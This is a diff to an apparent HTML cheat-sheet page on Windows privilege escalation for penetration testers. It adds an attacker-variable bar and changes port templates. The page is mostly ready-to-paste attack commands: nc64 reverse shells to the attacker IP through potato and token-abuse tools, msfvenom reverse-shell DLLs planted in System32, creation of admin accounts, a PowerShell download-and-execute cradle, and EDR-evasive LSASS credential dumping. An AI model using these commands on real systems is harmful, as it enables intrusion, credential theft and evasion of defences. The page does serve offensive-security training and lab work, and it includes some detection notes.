@@ -83,10 +83,79 @@
     letter-spacing: 1px;
   }
 
+  /* VARBAR */
+  .varbar {
+    background: #0c0c0c;
+    border-top: 1px solid #1a1a1a;
+    border-bottom: 2px solid var(--accent);
+    padding: 8px 24px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    align-items: center;
+    position: sticky;
+    top: 65px;
+    z-index: 99;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.5);
+  }
+
+  .varbar-group {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .varbar-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--accent);
+    letter-spacing: 1px;
+    white-space: nowrap;
+  }
+
+  .varbar-input {
+    background: #0a0a0a;
+    border: 1px solid #2a2a2a;
+    color: var(--teal);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 3px 8px;
+    border-radius: 2px;
+    width: 120px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+
+  .varbar-input:focus { border-color: var(--accent); }
+  .varbar-input.rport-auto { color: var(--orange); border-style: dashed; }
+  .varbar-input::placeholder { color: #333; }
+
+  .varbar-sep {
+    width: 1px;
+    height: 20px;
+    background: #222;
+    margin: 0 4px;
+  }
+
+  .varbar-apply {
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 4px 12px;
+    border-radius: 2px;
+    cursor: pointer;
+    letter-spacing: 1px;
+    transition: background 0.15s;
+  }
+
+  .varbar-apply:hover { background: var(--accent2); }
+
   /* LAYOUT */
   .layout {
     display: flex;
-    height: calc(100vh - 65px);
+    height: calc(100vh - 113px);
   }
 
   /* SIDEBAR */
@@ -506,6 +575,41 @@
   </div>
 </div>
 
+<div class="varbar" id="varbar">
+  <div class="varbar-group">
+    <span class="varbar-label">KALI_IP</span>
+    <input class="varbar-input" id="vi-kali" placeholder="10.10.14.x" maxlength="40" title="Your Kali/attacker IP">
+  </div>
+  <div class="varbar-sep"></div>
+  <div class="varbar-group">
+    <span class="varbar-label">PORT</span>
+    <input class="varbar-input" id="vi-port" placeholder="8080" maxlength="6" style="width:70px" title="HTTP file server port (python3 -m http.server)">
+  </div>
+  <div class="varbar-group">
+    <span class="varbar-label" title="Auto: PORT-1. Edit to override.">RPORT</span>
+    <input class="varbar-input rport-auto" id="vi-rport" placeholder="auto" maxlength="6" style="width:70px" title="Reverse shell listener port — auto = PORT-1">
+  </div>
+  <div class="varbar-sep"></div>
+  <div class="varbar-group">
+    <span class="varbar-label">TARGET</span>
+    <input class="varbar-input" id="vi-target" placeholder="192.168.x.x" maxlength="40" title="Target IP or hostname">
+  </div>
+  <div class="varbar-group">
+    <span class="varbar-label">USER</span>
+    <input class="varbar-input" id="vi-user" placeholder="administrator" maxlength="40" style="width:110px" title="Username">
+  </div>
+  <div class="varbar-group">
+    <span class="varbar-label">PASS</span>
+    <input class="varbar-input" id="vi-pass" placeholder="password" maxlength="64" style="width:110px" title="Password">
+  </div>
+  <div class="varbar-sep"></div>
+  <div class="varbar-group">
+    <span class="varbar-label">WPATH</span>
+    <input class="varbar-input" id="vi-wpath" placeholder="C:\Temp" maxlength="80" style="width:110px" title="Windows writable path on target">
+  </div>
+  <button class="varbar-apply" onclick="applyVars()">⚡ APPLY</button>
+</div>
+
 <div class="layout">
 
   <!-- SIDEBAR -->
@@ -532,18 +636,20 @@
     <div class="nav-item" onclick="showPage('sesysenv',this)"><span class="nav-dot gold"></span>SeSystemEnvironment</div>
     <div class="nav-item" onclick="showPage('seshutdown',this)"><span class="nav-dot blue"></span>SeShutdownPrivilege</div>
 
-    <div class="sidebar-section">🔵 Group-Based</div>
+    <div class="sidebar-section">&#128309; Group-Based</div>
     <div class="nav-item" onclick="showPage('backupops',this)"><span class="nav-dot blue"></span>Backup Operators Group</div>
-    <div class="nav-item" onclick="showPage('dnsadmins',this)"><span class="nav-dot blue"></span>DnsAdmins → SYSTEM</div>
+    <div class="nav-item" onclick="showPage('dnsadmins',this)"><span class="nav-dot blue"></span>DnsAdmins &rarr; SYSTEM</div>
     <div class="nav-item" onclick="showPage('serverops',this)"><span class="nav-dot blue"></span>Server Operators Group</div>
     <div class="nav-item" onclick="showPage('printops',this)"><span class="nav-dot blue"></span>Print Operators Group</div>
+    <div class="nav-item" onclick="showPage('accountops',this)"><span class="nav-dot blue"></span>Account Operators Group</div>
 
-    <div class="sidebar-section">🟡 Token Manipulation</div>
+    <div class="sidebar-section">&#128993; Token Manipulation</div>
     <div class="nav-item" onclick="showPage('fullpowers',this)"><span class="nav-dot gold"></span>FullPowers (Restore Token)</div>
     <div class="nav-item" onclick="showPage('enablepriv',this)"><span class="nav-dot gold"></span>Enable Disabled Privs</div>
 
-    <div class="sidebar-section">🔑 Rare / Situational</div>
+    <div class="sidebar-section">&#128273; Rare / Situational</div>
     <div class="nav-item" onclick="showPage('setrustedcredman',this)"><span class="nav-dot gold"></span>SeTrustedCredManAccess</div>
+    <div class="nav-item" onclick="showPage('serelabel',this)"><span class="nav-dot gold"></span>SeRelabelPrivilege</div>
 
     <div class="sidebar-section">💥 CVE Exploits</div>
     <div class="nav-item" onclick="showPage('cves',this)"><span class="nav-dot critical"></span>CVE Quick Reference</div>
@@ -868,7 +974,7 @@ whoami /priv</div>
               <div class="code-block green">REM Interactive -- spawns cmd.exe with full default privileges:
 .\FullPowers.exe
 REM Non-interactive -- run command and exit:
-.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z
+.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z
 REM Extended privilege set (may fail on NETWORK SERVICE):
 .\FullPowers.exe -x</div>
             </div>
@@ -957,7 +1063,7 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET2.exe -o {{WPATH}}\gp.exe</
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Execute &mdash; reverse shell</div>
-              <div class="code-block green">.\gp.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+              <div class="code-block green">.\gp.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM Optional named pipe override:
 .\gp.exe -cmd "cmd /c whoami" -pipe "mypipe"</div>
             </div>
@@ -1001,7 +1107,7 @@ REM Must show STATE: RUNNING -- if STOPPED, use GodPotato or SigmaPotato instead
 REM Spawn on desktop session ID (GUI session):
 .\ps.exe -d 1 -c cmd
 REM Non-interactive reverse shell:
-.\ps.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+.\ps.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="alert alert-gold">
@@ -1030,10 +1136,10 @@ REM Non-interactive reverse shell:
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Execute &mdash; try both token methods</div>
-              <div class="code-block green">.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+              <div class="code-block green">.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM -t * tries CreateProcessWithTokenW AND CreateProcessAsUser
 REM Specify COM port if 10247 is in use:
-.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l {{PORT}}
+.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l 10247
 REM Bruteforce CLSIDs if default fails:
 .\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -b</div>
             </div>
@@ -1068,9 +1174,9 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/SigmaPotatoCore.exe -o {{WPATH}}\sigma.e
             <div class="step-content">
               <div class="step-title">Execute</div>
               <div class="code-block green">REM Run arbitrary command as SYSTEM:
-.\sigma.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+.\sigma.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM Built-in reverse shell:
-.\sigma.exe --revshell {{KALI_IP}} {{PORT}}</div>
+.\sigma.exe --revshell {{KALI_IP}} {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
@@ -1078,8 +1184,8 @@ REM Built-in reverse shell:
             <div class="step-content">
               <div class="step-title">PowerShell .NET reflection (fileless)</div>
               <div class="code-block green">[Reflection.Assembly]::LoadFile("{{WPATH}}\SigmaPotato.exe")
-[SigmaPotato]::Main("cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd")
-[Reflection.Assembly]::LoadFile("{{WPATH}}\SigmaPotato.exe"); [SigmaPotato]::Main(@("--revshell","{{KALI_IP}}","{{PORT}}"))</div>
+[SigmaPotato]::Main("cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd")
+[Reflection.Assembly]::LoadFile("{{WPATH}}\SigmaPotato.exe"); [SigmaPotato]::Main(@("--revshell","{{KALI_IP}}","{{RPORT}}"))</div>
             </div>
           </div>
           <div class="alert alert-gold">
@@ -1108,7 +1214,7 @@ REM Built-in reverse shell:
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Execute &mdash; EfsRpc mode (no Spooler needed)</div>
-              <div class="code-block green">.\sweet.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">.\sweet.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
@@ -1116,7 +1222,7 @@ REM Built-in reverse shell:
             <div class="step-content">
               <div class="step-title">Other modes</div>
               <div class="code-block">REM DCOM mode:
-.\sweet.exe -e DCOM -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"
+.\sweet.exe -e DCOM -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{RPORT}} -e cmd"
 REM PrintSpoofer mode (default; Spooler required):
 .\sweet.exe -p cmd.exe</div>
             </div>
@@ -1147,7 +1253,7 @@ REM PrintSpoofer mode (default; Spooler required):
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Execute</div>
-              <div class="code-block green">.\sefsp.exe -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"
+              <div class="code-block green">.\sefsp.exe -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{RPORT}} -e cmd"
 .\sefsp.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\Users\Public\w.txt"</div>
             </div>
           </div>
@@ -1181,7 +1287,7 @@ REM PrintSpoofer mode (default; Spooler required):
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Kali &mdash; Start reverse shell listener</div>
-              <div class="code-block purple">nc -lvnp {{PORT}}</div>
+              <div class="code-block purple">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
@@ -1195,9 +1301,9 @@ REM PrintSpoofer mode (default; Spooler required):
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">Execute on target</div>
-              <div class="code-block green">.\rogue.exe -r {{KALI_IP}} -l 9999 -e "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+              <div class="code-block green">.\rogue.exe -r {{KALI_IP}} -l 9999 -e "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM Randomize pipe name (stealth):
-.\rogue.exe -r {{KALI_IP}} -l 9999 -e "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z</div>
+.\rogue.exe -r {{KALI_IP}} -l 9999 -e "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</div>
             </div>
           </div>
           <div class="alert alert-gold">
@@ -1231,7 +1337,7 @@ certutil -urlcache -f http://{{KALI_IP}}:{{PORT}}/windows/nc.exe {{WPATH}}\nc.ex
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Execute</div>
-              <div class="code-block green">.\churrasco.exe "{{WPATH}}\nc.exe {{KALI_IP}} {{PORT}} -e cmd"
+              <div class="code-block green">.\churrasco.exe "{{WPATH}}\nc.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM Add admin user:
 .\churrasco.exe "net user hax0r P@ssw0rd1 /add"
 .\churrasco.exe "net localgroup administrators hax0r /add"</div>
@@ -1377,7 +1483,7 @@ REM If RUNNING/LISTEN on 5985 -- this technique WILL NOT WORK; use a potato inst
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Start Kali nc listener</div>
-              <div class="code-block green">nc -lvnp {{PORT}}</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
@@ -1385,7 +1491,7 @@ REM If RUNNING/LISTEN on 5985 -- this technique WILL NOT WORK; use a potato inst
             <div class="step-content">
               <div class="step-title">Run RogueWinRM on target &mdash; will listen on 5985 and run command as SYSTEM</div>
               <div class="code-block green">REM Non-interactive reverse shell:
-.\RogueWinRM.exe -p "{{WPATH}}\nc64.exe" -a "{{KALI_IP}} {{PORT}} -e cmd"
+.\RogueWinRM.exe -p "{{WPATH}}\nc64.exe" -a "{{KALI_IP}} {{RPORT}} -e cmd"
 REM Interactive (spawns cmd in current console, requires SeImpersonate):
 .\RogueWinRM.exe -p C:\Windows\System32\cmd.exe</div>
             </div>
@@ -1599,29 +1705,32 @@ Get-Item "C:\Windows\System32\wbem\tzres.dll" | Select-Object Length,LastWriteTi
         </div>
       </div>
 
-      <!-- ALTERNATIVE 4: wbemcomn.dll + iphlpsvc -->
+      <!-- ALTERNATIVE 4: wbemcomn.dll + WMI trigger (wmiprvse.exe) -->
       <div class="section">
-        <div class="section-header">🔁 Alternative 4 — wbemcomn.dll + sc restart iphlpsvc</div>
+        <div class="section-header">&#128260; Alternative 4 &mdash; wbemcomn.dll + WMI trigger (wmiprvse.exe loads it)</div>
         <div class="section-body">
-          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>IP Helper service (iphlpsvc) loads wbemcomn.dll on restart. Works when you have permission to restart the service.</span></div>
+          <div class="alert alert-gold"><span class="alert-icon">&#9733;</span><span><strong>wbemcomn.dll</strong> is a WMI component loaded by <strong>wmiprvse.exe</strong> (WMI Provider Host). Drop it into <code>C:\Windows\System32\</code>, then trigger any WMI call — <code>systeminfo</code>, <code>Get-WmiObject</code>, or <code>sc query</code> will all cause wmiprvse.exe to load your DLL as SYSTEM. <strong>This has NOTHING to do with iphlpsvc</strong> — that was an earlier documentation error.</span></div>
           <div class="step"><div class="step-num">1</div><div class="step-content">
-            <div class="step-title">Kali — generate wbemcomn.dll</div>
+            <div class="step-title">Kali &mdash; generate wbemcomn.dll</div>
             <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o wbemcomn.dll
 python3 -m http.server {{PORT}}</div>
           </div></div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
-            <div class="step-title">Windows — place the DLL</div>
-            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
-          </div></div>
-          <div class="step"><div class="step-num">3</div><div class="step-content">
-            <div class="step-title">Kali — start handler</div>
+            <div class="step-title">Kali &mdash; start reverse shell handler first (DLL may trigger immediately on drop)</div>
             <div class="code-block green">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {{RPORT}}; run"</div>
           </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Windows &mdash; drop the DLL into System32 (requires C:\ write from SeManageVolumeExploit)</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
+          </div></div>
           <div class="step"><div class="step-num">4</div><div class="step-content">
-            <div class="step-title">Windows — trigger by restarting iphlpsvc</div>
-            <div class="code-block purple">sc.exe stop iphlpsvc
-sc.exe start iphlpsvc
-# If access denied, try: Restart-Service -Name iphlpsvc -Force</div>
+            <div class="step-title">Windows &mdash; trigger WMI to load the DLL (wmiprvse.exe runs as SYSTEM)</div>
+            <div class="code-block purple">REM Any of these will trigger wmiprvse.exe to load wbemcomn.dll:
+systeminfo
+REM Or:
+Get-WmiObject Win32_OperatingSystem
+REM Or restart the WMI service (requires sc rights):
+sc.exe stop winmgmt &amp;&amp; sc.exe start winmgmt</div>
           </div></div>
         </div>
       </div>
@@ -1834,14 +1943,14 @@ mimikatz # sekurlsa::logonpasswords full</div>
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Impersonate SYSTEM by inheriting the parent process token — spawn reverse shell</div>
-              <div class="code-block green">ImpersonateFromParentPid -ppid (Get-Process winlogon).Id -command "C:\Windows\System32\cmd.exe" -cmdargs "/c C:\Temp\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">ImpersonateFromParentPid -ppid (Get-Process winlogon).Id -command "C:\Windows\System32\cmd.exe" -cmdargs "/c C:\Temp\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">Kali: catch SYSTEM shell</div>
-              <div class="code-block green">nc -lvnp {{PORT}}</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="alert alert-gold">
@@ -1871,9 +1980,70 @@ mimikatz # sekurlsa::logonpasswords full</div>
         </div>
       </div>
 
+      <!-- Vector 5: Advanced / Fileless -->
+      <div class="section">
+        <div class="section-header">&#9889; Vector 5 &mdash; Fileless / EDR-Evasive Methods (Nanodump, NativeDump)</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span>procdump64 and comsvcs.dll are heavily signatured. For real engagements or AV-protected labs, use these alternatives that avoid <code>MiniDumpWriteDump</code> API calls entirely.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Nanodump (fortra) &mdash; indirect syscalls, --silent-process-exit mode</div>
+              <div class="code-block purple">REM Transfer nanodump:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/nanodump.exe -o {{WPATH}}\nd.exe
+REM Standard dump (avoids MiniDumpWriteDump via indirect syscalls):
+.\nd.exe --write C:\Temp\lsass.dmp
+REM Silent-process-exit mode (WerFault triggers dump — very OPSEC safe):
+.\nd.exe --silent-process-exit C:\Temp\lsass.dmp
+REM Parse dump on Kali:
+python3 -c "import base64" REM  then: mimikatz sekurlsa::minidump lsass.dmp</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">NativeDump (ricardojoserf) &mdash; NTAPI-only, hand-crafted minidump, no MiniDumpWriteDump</div>
+              <div class="code-block purple">REM Transfer NativeDump:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/NativeDump.exe -o {{WPATH}}\nd2.exe
+REM Dump LSASS using only native APIs (NtReadVirtualMemory, NtQuerySystemInformation):
+.\nd2.exe
+REM Output: lsass.dmp in current directory
+REM Parse on Kali: pypykatz lsa minidump lsass.dmp</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">SafetyKatz &mdash; in-memory Mimikatz (no disk write)</div>
+              <div class="code-block purple">REM Load Mimikatz reflectively in memory via .NET — no PE on disk:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/SafetyKatz.exe -o {{WPATH}}\sk.exe
+.\sk.exe "sekurlsa::logonpasswords" "exit"
+REM Or via PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://{{KALI_IP}}:{{PORT}}/scripts/Invoke-Mimikatz.ps1')</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Parse any .dmp on Kali with pypykatz (no Mimikatz needed)</div>
+              <div class="code-block green">pip3 install pypykatz
+pypykatz lsa minidump lsass.dmp
+REM Or with mimikatz offline:
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>Nanodump: <a href="https://github.com/fortra/nanodump" target="_blank">github.com/fortra/nanodump</a> | NativeDump: <a href="https://github.com/ricardojoserf/NativeDump" target="_blank">github.com/ricardojoserf/NativeDump</a> | SafetyKatz: <a href="https://github.com/GhostPack/SafetyKatz" target="_blank">github.com/GhostPack/SafetyKatz</a></span>
+          </div>
+        </div>
+      </div>
+
       <div class="detection-box">
-        <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656 — handle to lsass.exe with access mask 0x1FFFFF • procdump.exe or rundll32+comsvcs.dll reading lsass memory • Sysmon Event 10 — process access on lsass.exe by non-SYSTEM/non-WerFault process • .dmp file created in Temp directories • Event 4672 SeDebugPrivilege assigned to new logon</div>
+        <div class="detection-title">&#128269; Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656 &mdash; handle to lsass.exe with access mask 0x1FFFFF &bull; procdump.exe or rundll32+comsvcs.dll reading lsass memory &bull; Sysmon Event 10 &mdash; process access on lsass.exe by non-SYSTEM/non-WerFault process &bull; .dmp file created in Temp directories &bull; Event 4672 SeDebugPrivilege assigned to new logon &bull; Indirect syscall patterns (nanodump) &bull; NtReadVirtualMemory called on lsass.exe by unexpected process (NativeDump)</div>
       </div>
     </div>
 
@@ -1929,8 +2099,9 @@ mimikatz # sekurlsa::logonpasswords full</div>
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Import SeBackupPrivilege DLLs (upload both to target first)</div>
-              <div class="code-block purple">Import-Module .\SeBackupPrivilegeCmdLets.dll
-Import-Module .\SeBackupPrivilegeUtils.dll</div>
+              <div class="code-block purple">Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+REM ORDER MATTERS: Utils FIRST (provides base functions), CmdLets SECOND (depends on Utils)</div>
             </div>
           </div>
           <div class="step">
@@ -2361,7 +2532,7 @@ icacls "C:\Program Files\VulnSvc\svc.exe" /grant "%USERNAME%":F</div>
             <div class="step-content">
               <div class="step-title">Generate and transfer nc64-based reverse shell or adduser exe, then copy over binary</div>
               <div class="code-block purple">REM Kali: generate reverse shell EXE
-msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{PORT}} -f exe -o svc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f exe -o svc.exe
 REM Or: adduser-style payload (no listener needed):
 msfvenom -p windows/x64/exec CMD="net user hacker P@ssw0rd1 /add &amp;&amp; net localgroup administrators hacker /add" -f exe -o svc.exe
 REM Transfer to target and replace:
@@ -2373,7 +2544,7 @@ copy /Y C:\Temp\svc.exe "C:\Program Files\VulnSvc\svc.exe"</div>
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">Start listener on Kali (if reverse shell), then restart service</div>
-              <div class="code-block green">nc -lvnp {{PORT}}
+              <div class="code-block green">nc -lvnp {{RPORT}}
 REM On target:
 sc stop VulnSvc
 sc start VulnSvc
@@ -2451,7 +2622,8 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64exploit.exe -o C:\Temp\szkg64explo
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">Cleanup registry key after exploitation</div>
-              <div class="code-block">reg delete HKCU\System\CurrentControlSet\MyService /f</div>
+              <div class="code-block">reg delete HKLM\System\CurrentControlSet\Services\MyService /f
+REM NOTE: Windows 10 1803+ forbids NTLoadDriver from HKCU — the key is under HKLM\System\CurrentControlSet\Services\</div>
             </div>
           </div>
           <div class="alert alert-gold">
@@ -2493,21 +2665,22 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -o C:\Temp\ExploitCapc
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Run ExploitCapcom against the loaded driver to execute arbitrary command as SYSTEM</div>
-              <div class="code-block green">C:\Temp\ExploitCapcom.exe EXPLOIT "C:\Temp\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">C:\Temp\ExploitCapcom.exe EXPLOIT "C:\Temp\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Kali: catch SYSTEM shell</div>
-              <div class="code-block green">nc -lvnp {{PORT}}</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">Cleanup registry key</div>
-              <div class="code-block">reg delete HKCU\System\CurrentControlSet\CapService /f</div>
+              <div class="code-block">reg delete HKLM\System\CurrentControlSet\Services\CapService /f
+REM HKLM — driver was loaded under HKLM\System\CurrentControlSet\Services\ (not HKCU on modern Windows)</div>
             </div>
           </div>
           <div class="alert alert-red">
@@ -2586,14 +2759,14 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -o C:\Temp\ExploitCapc
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Spawn SYSTEM reverse shell — CLI syntax: TcbElevation.exe [ServiceName] [CmdLine]</div>
-              <div class="code-block green">C:\Temp\TcbElevation.exe syscvs "C:\Windows\System32\cmd.exe /c C:\Temp\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">C:\Temp\TcbElevation.exe syscvs "C:\Windows\System32\cmd.exe /c C:\Temp\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Kali: catch SYSTEM shell</div>
-              <div class="code-block green">nc -lvnp {{PORT}}</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
@@ -2616,7 +2789,7 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -o C:\Temp\ExploitCapc
 
       <!-- PsBits alternative -->
       <div class="section">
-        <div class="section-header">&#9889; Alternative &mdash; PsBits (s3cur3th1ssh1t) &mdash; S4U Token via SeTcbPrivilege</div>
+        <div class="section-header">&#9889; Alternative &mdash; PsBits (gtworek/PSBits) &mdash; S4U Token via SeTcbPrivilege</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -2625,25 +2798,26 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -o C:\Temp\ExploitCapc
               <div class="code-block purple">REM PsBits provides Get-System with SeTcb/S4U method
 REM github.com/mgeeky/PackMyPayload for packaging OR compile PsBits.cs:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/PsBits.exe -o C:\Temp\PsBits.exe
-REM Source: github.com/s3cur3th1ssh1t/PsBits (Go-based, S4U token via SeTcbPrivilege)</div>
+REM Source/binary: github.com/gtworek/PSBits (look in SeTcb* folder for compiled release)
+REM Source: github.com/gtworek/PSBits (PowerShell/C# privilege toolkit with SeTcb exploitation)</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Execute PsBits to spawn SYSTEM shell</div>
-              <div class="code-block green">.\PsBits.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+              <div class="code-block green">.\PsBits.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM Or simply spawn an interactive cmd:
 .\PsBits.exe cmd.exe</div>
             </div>
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
-            <span>PsBits uses <code>LsaLogonUser</code> with S4U (same mechanism as TcbElevation) but written in Go. Works as a fallback if TcbElevation.exe errors. Compile on Kali: <code>git clone github.com/s3cur3th1ssh1t/PsBits &amp;&amp; go build -o PsBits.exe .</code></span>
+            <span>PSBits by gtworek is a PowerShell/C# collection of privilege exploitation tools. It includes SeTcbPrivilege PoCs and helpers. Use the compiled binaries from Releases or compile the C# source in Visual Studio.</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">&#128279;</span>
-            <span>GitHub: <a href="https://github.com/s3cur3th1ssh1t/PsBits" target="_blank">github.com/s3cur3th1ssh1t/PsBits</a></span>
+            <span>GitHub: <a href="https://github.com/gtworek/PSBits" target="_blank">github.com/gtworek/PSBits</a></span>
           </div>
         </div>
       </div>
@@ -2960,7 +3134,7 @@ cmd /c mklink "C:\Python39\version.dll" "C:\Temp\evil.dll"
             <div class="step-content">
               <div class="step-title">Generate malicious DLL on Kali</div>
               <div class="code-block purple">REM DLL for reverse shell:
-msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{PORT}} -f dll -o cryptbase.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o cryptbase.dll
 REM Or adduser DLL (no listener needed):
